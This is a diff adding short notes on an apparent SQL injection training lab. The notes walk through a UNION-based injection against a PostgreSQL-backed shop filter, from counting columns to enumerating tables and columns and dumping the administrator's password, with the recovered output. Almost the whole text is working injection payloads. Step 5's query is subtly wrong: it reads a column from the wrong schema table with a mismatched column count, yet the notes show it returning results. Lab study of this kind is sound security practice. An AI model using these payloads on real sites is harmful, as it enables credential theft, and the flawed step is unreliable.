@@ -1,0 +1,38 @@
+Listing the database contents on non-Oracle database
+
+End goal: 
+- Determine the table that contains usernames and passwords
+- Determine the relevant columns
+- Output the content of the table
+- Login as the administrator
+
+Analysis:
+1. Find the number of columns
+Gifts' ORDER BY 3-- => internal server error
+
+3 - 1 = 2 columns
+
+2. Determine the data types of columns
+Gifts' UNION SELECT 'a', 'a'--
+=> both cols accept type text
+
+3. Version of the database
+' UNION select @@version, NULL-- -> not Microsoft
+' UNION select version(), NULL-- -> PostgreSQL
+
+4. Output the list of table names in the database
+' UNION SELECT table_name, NULL FROM information_schema.tables--
+
+users_kvspvm
+
+5. Output the columns' name of the table
+' UNION select column_name FROM information_schema.tables WHERE table_name='users_kvspvm'--
+
+username_imgsmq
+password_jfqedd
+
+6. Output the password of administrator
+' UNION select username_imgsmq, password_jfqedd FROM users_kvspvm WHERE username_imgsmq='administrator'--
+
+administrator
+vgso9uumg5s1vabvlc1j
